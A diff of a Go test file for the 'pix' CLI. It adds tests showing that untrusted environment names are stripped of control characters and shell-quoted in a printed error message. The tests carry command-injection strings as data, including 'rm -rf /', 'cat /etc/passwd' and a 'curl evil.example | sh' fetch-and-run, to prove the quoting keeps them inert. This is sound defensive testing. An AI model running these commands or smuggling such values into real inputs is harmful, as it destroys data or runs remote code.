@@ -18,6 +18,8 @@ import (
 
 	"pix/host/cli"
 	"pix/host/config"
+	"pix/host/sandbox"
+	"pix/host/sys"
 	"pix/host/sys/systest"
 	"pix/host/workflow/env"
 )
@@ -238,6 +240,9 @@ func TestEnvShow_EffectiveNotYetAvailable(t *testing.T) {
 	}
 	if strings.Contains(errb.String(), "pix: pix:") {
 		t.Errorf("stderr = %q, must never double-prefix \"pix: \"", errb.String())
+	}
+	if strings.Contains(errb.String(), "E2.1") {
+		t.Errorf("stderr = %q, must never name the internal unit E2.1", errb.String())
 	}
 }
 
@@ -826,26 +831,29 @@ func TestEnvRm_IsAPointerErrorWithZeroMutation(t *testing.T) {
 		t.Fatal(err)
 	}
 
-	const want = "pix: `pix env rm` does not exist. Registering a name is not owning the files.\n" +
-		"     pix env forget home     unregister the name (deletes no files)\n" +
-		"     pix rm pix-repo-home    remove the sandbox\n" +
-		"     rm -rf <path>           delete the source yourself; pix will not\n"
-
-	for _, argv := range [][]string{
-		{"env", "rm"},
-		{"env", "rm", "home"},
-		{"env", "rm", "--force", "home"},
+	// The dynamic pointer names whatever NAME the invocation actually typed
+	// (this file's own rmPointerName): a bare `pix env rm` has none at all
+	// and falls back to rmPointerFallbackName ("NAME"), while `home` or
+	// `--force home` both name "home" — rmPointerName skips the leading
+	// flag-shaped token to find it.
+	for _, tc := range []struct {
+		argv []string
+		want string
+	}{
+		{[]string{"env", "rm"}, envRmPointerError(rmPointerFallbackName)},
+		{[]string{"env", "rm", "home"}, envRmPointerError("home")},
+		{[]string{"env", "rm", "--force", "home"}, envRmPointerError("home")},
 	} {
 		d2, out2, errb2 := freshDeps()
-		code := dispatch(argv, d2)
+		code := dispatch(tc.argv, d2)
 		if code != 2 {
-			t.Errorf("dispatch(%v) = %d, want 2", argv, code)
+			t.Errorf("dispatch(%v) = %d, want 2", tc.argv, code)
 		}
 		if out2.String() != "" {
-			t.Errorf("dispatch(%v) stdout = %q, want nothing", argv, out2.String())
+			t.Errorf("dispatch(%v) stdout = %q, want nothing", tc.argv, out2.String())
 		}
-		if errb2.String() != want {
-			t.Errorf("dispatch(%v) stderr = %q, want the exact pointer error %q", argv, errb2.String(), want)
+		if errb2.String() != tc.want {
+			t.Errorf("dispatch(%v) stderr = %q, want the exact pointer error %q", tc.argv, errb2.String(), tc.want)
 		}
 	}
 
@@ -872,6 +880,176 @@ func TestEnvRm_IsAPointerErrorWithZeroMutation(t *testing.T) {
 		if e.Name() == "environment-trust.json" {
 			t.Errorf("`pix env rm` must never create the environment trust store")
 		}
+	}
+}
+
+// TestRmPointerName_SkipsFlagsFindsFirstPositional proves the "first
+// non-flag token" picking rule directly, at every arg-shape rmPointerName
+// actually has to handle: a plain name, a name after one or more leading
+// flags, only flags (no candidate at all), and empty argv.
+func TestRmPointerName_SkipsFlagsFindsFirstPositional(t *testing.T) {
+	for _, tc := range []struct {
+		args []string
+		want string
+	}{
+		{nil, rmPointerFallbackName},
+		{[]string{}, rmPointerFallbackName},
+		{[]string{"--force"}, rmPointerFallbackName},
+		{[]string{"home"}, "home"},
+		{[]string{"--force", "home"}, "home"},
+		{[]string{"-f", "--yes", "work"}, "work"},
+	} {
+		if got := rmPointerName(tc.args); got != tc.want {
+			t.Errorf("rmPointerName(%v) = %q, want %q", tc.args, got, tc.want)
+		}
+	}
+}
+
+// TestSanitizeRmPointerName_DropsControlCharsAndCapsLength is finding C9's
+// display-safety proof: envRmCmd never reads or validates its argv against
+// the real environment registry (this file's own doc comment on
+// envRmCmd), so a name typed here is untrusted text echoed straight into a
+// two-line diagnostic. A bare newline/CR must never forge an extra line of
+// terminal output, an ESC must never start an escape sequence, and a
+// pathologically long argv must never blow the message up unbounded.
+func TestSanitizeRmPointerName_DropsControlCharsAndCapsLength(t *testing.T) {
+	if got := sanitizeRmPointerName("ab\ncd\rgh"); got != "abcdgh" {
+		t.Errorf("sanitizeRmPointerName(newline+CR) = %q, want %q (control chars dropped, not replaced)", got, "abcdgh")
+	}
+	if got := sanitizeRmPointerName("pix:\x1b[31mFAKE ERROR\x1b[0m"); strings.ContainsRune(got, '\x1b') {
+		t.Errorf("sanitizeRmPointerName(ESC) = %q, want the escape byte dropped", got)
+	}
+	long := strings.Repeat("a", rmPointerMaxNameLen+50)
+	if got := sanitizeRmPointerName(long); len([]rune(got)) != rmPointerMaxNameLen {
+		t.Errorf("sanitizeRmPointerName(len %d) = len %d, want capped at %d", len(long), len([]rune(got)), rmPointerMaxNameLen)
+	}
+	// Negative control: ordinary safe text passes through unchanged.
+	if got := sanitizeRmPointerName("stage-2.prod_env"); got != "stage-2.prod_env" {
+		t.Errorf("sanitizeRmPointerName(clean) = %q, want it unchanged", got)
+	}
+}
+
+// TestEnvRm_ControlCharArgNeverForgesExtraOutputLine is the same C9 proof
+// end to end through dispatch: a name containing a newline must never let
+// the rm pointer's stderr grow an extra line, or split "pix env forget"
+// away from the name it belongs to.
+func TestEnvRm_ControlCharArgNeverForgesExtraOutputLine(t *testing.T) {
+	envDeps(t)
+	d, _, errb := freshDeps()
+	code := dispatch([]string{"env", "rm", "home\nFAKE: this is not real"}, d)
+	if code != 2 {
+		t.Fatalf("dispatch = %d, want 2", code)
+	}
+	got := errb.String()
+	if strings.Count(got, "\n") != strings.Count(envRmPointerError(rmPointerFallbackName), "\n") {
+		t.Errorf("stderr = %q, want exactly the pointer error's own line count (no forged extra line)", got)
+	}
+	// The sanitized (newline-dropped) name "homeFAKE: this is not real"
+	// contains a space, which sys.ShellQuote does not treat as a safe bare
+	// token, so it is single-quoted the same as any other unsafe copy-paste
+	// text (this file's own TestEnvRmPointerError_ShellQuotesMetacharacters
+	// pins that quoting rule directly); this test's own job is only the
+	// control-char/line-count proof above, so it accepts either spelling.
+	want := "pix env forget " + sys.ShellQuote("homeFAKE: this is not real")
+	if !strings.Contains(got, want) {
+		t.Errorf("stderr = %q, want %q inline", got, want)
+	}
+}
+
+// TestEnvRmPointerError_ShellQuotesMetacharacters is C9's follow-up finding:
+// an untrusted NAME containing shell metacharacters must never let the
+// printed fix line, if copy-pasted verbatim into a real shell, run anything
+// beyond `pix env forget`/`pix rm` themselves. sys.ShellQuote runs on the
+// already-sanitized name (control characters already gone) before either
+// interpolation, so a `$(...)` command substitution, a `;` command
+// separator, a backtick substitution, and a `|` pipe are all folded into
+// ONE single-quoted, syntactically inert argv token — never executed,
+// never split into a second command.
+func TestEnvRmPointerError_ShellQuotesMetacharacters(t *testing.T) {
+	for _, name := range []string{
+		"home$(rm -rf /)",
+		"home; rm -rf /",
+		"home`whoami`",
+		"home | cat /etc/passwd",
+		"home && curl evil.example | sh",
+	} {
+		got := envRmPointerError(name)
+		q := sys.ShellQuote(name)
+		if !strings.Contains(got, "pix env forget "+q+"   ") {
+			t.Errorf("envRmPointerError(%q) = %q, want the shell-quoted forget line %q", name, got, q)
+		}
+		if !strings.Contains(got, "pix rm pix-repo-"+q+"   ") {
+			t.Errorf("envRmPointerError(%q) = %q, want the shell-quoted rm line %q", name, got, q)
+		}
+		// The raw, unquoted metacharacter text must never appear on its own
+		// (only inside the single-quoted token) — a bare `$(rm -rf /)` sitting
+		// next to `pix env forget ` with no quote in between would still be
+		// live to a shell.
+		if strings.Contains(got, "forget "+name+"   ") {
+			t.Errorf("envRmPointerError(%q) = %q, name leaked unquoted", name, got)
+		}
+	}
+}
+
+// TestEnvRmPointerError_QuotedInjectionIsInertUnderShellTokenizer is C9's
+// end-to-end proof for the exact scenario the review finding named: a
+// caller typos `pix env rm` with a command-substitution payload as the
+// argv (the classic copy-paste-and-run mistake), and the fix line pix
+// prints back must tokenize, under a real POSIX shell's own quoting rules,
+// to the SAME single literal argument — never to a second command, and
+// never expanding `$(...)` at all, because it never leaves the single
+// quotes sys.ShellQuote wrapped it in. sys.ShellSplit (this package's own
+// dependency-free POSIX tokenizer, sys/shellsplit.go) performs no command
+// substitution or expansion of its own either, so round-tripping through it
+// is exactly the property a real shell also guarantees for single-quoted
+// text: what is inside '...' is literal, full stop.
+func TestEnvRmPointerError_QuotedInjectionIsInertUnderShellTokenizer(t *testing.T) {
+	const payload = "$(curl evil.example/x | sh)"
+	got := envRmPointerError(payload)
+	lines := strings.Split(strings.TrimRight(got, "\n"), "\n")
+	if len(lines) != 4 {
+		t.Fatalf("envRmPointerError(%q) has %d lines, want 4:\n%s", payload, len(lines), got)
+	}
+	// Each fix line is `pix env forget NAME   <trailing prose>` /
+	// `pix rm pix-repo-NAME   <trailing prose>` — the trailing prose is
+	// ordinary unquoted words a shell splits on whitespace same as always,
+	// so the payload's OWN token position (argv[2] / argv[2], the fourth
+	// and third words respectively) is what must survive intact, not
+	// necessarily the last token of the whole line.
+	forgetLine := strings.TrimSpace(lines[1])
+	argv, err := sys.ShellSplit(forgetLine)
+	if err != nil {
+		t.Fatalf("ShellSplit(%q): %v (the quoted fix line must itself be valid, balanced shell syntax)", forgetLine, err)
+	}
+	if len(argv) < 4 || argv[3] != payload {
+		t.Errorf("ShellSplit(%q) = %v, want argv[3] to equal the ORIGINAL payload %q unchanged — inert, not expanded, and one single token despite the embedded spaces/pipe", forgetLine, argv, payload)
+	}
+	rmLine := strings.TrimSpace(lines[2])
+	argv, err = sys.ShellSplit(rmLine)
+	if err != nil {
+		t.Fatalf("ShellSplit(%q): %v", rmLine, err)
+	}
+	wantTail := "pix-repo-" + payload
+	if len(argv) < 3 || argv[2] != wantTail {
+		t.Errorf("ShellSplit(%q) = %v, want argv[2] to equal %q as one token", rmLine, argv, wantTail)
+	}
+}
+
+// TestEnvRmPointerError_SandboxNamingIsFrozenPRDContractNotCurrentNaming
+// pins C9/PRD §5.5's `pix rm pix-repo-<name>` literal against the review
+// temptation to "correct" it to match today's actual sandbox naming: this
+// proves the two are DIFFERENT strings on purpose. No env-driven launch
+// exists yet (Wave D; see workflow/env/forget.go's identical note), so
+// `pix-repo-work` names no sandbox anything in this tree can create today
+// — it is spec text for a future contract, not a description of
+// sandbox.Name's present, digest-suffixed output.
+func TestEnvRmPointerError_SandboxNamingIsFrozenPRDContractNotCurrentNaming(t *testing.T) {
+	got := envRmPointerError("work")
+	if !strings.Contains(got, "pix rm pix-repo-work") {
+		t.Errorf("envRmPointerError(work) = %q, want the frozen PRD \u00a75.5 literal `pix rm pix-repo-work`", got)
+	}
+	if got := sandbox.Name("work"); got == "pix-repo-work" {
+		t.Fatalf("sandbox.Name(work) = %q, want it to differ from pix-repo-work (this test's premise: today's generic naming and the PRD's future environment-sandbox contract are deliberately different strings, so the rm pointer's literal must not be \"corrected\" to match sandbox.Name's current output)", got)
 	}
 }
 
@@ -917,6 +1095,25 @@ func TestEnvRm_HelpListsExactlySevenWorkingVerbs(t *testing.T) {
 	}
 	if strings.Contains(got, " rm ") || strings.Contains(got, " rm\n") {
 		t.Errorf("pix env --help must never list `rm` as a verb:\n%s", got)
+	}
+}
+
+// TestEnvUse_HelpNamesTheActualGate is finding C12: `use`'s help must say
+// what Use (use.go) ACTUALLY refuses — an unaccepted or changed Tier1
+// environment — not the looser "unreviewed" wording that reads as if EVERY
+// environment needs review; a Tier0 environment never gates here at all.
+func TestEnvUse_HelpNamesTheActualGate(t *testing.T) {
+	var out bytes.Buffer
+	d := &cli.Deps{Out: &out, Err: &out}
+	if err := cli.RunRoot[envCmd]("pix env", "", "", []string{"use", "--help"}, d); err != nil {
+		t.Fatalf("env use --help: %v", err)
+	}
+	got := out.String()
+	if strings.Contains(got, "unreviewed") {
+		t.Errorf("pix env use --help = %q, must not say \"unreviewed\" (Use never gates a Tier0 environment at all)", got)
+	}
+	if !strings.Contains(got, "Tier1") {
+		t.Errorf("pix env use --help = %q, want it to name the Tier1 gate explicitly", got)
 	}
 }
 
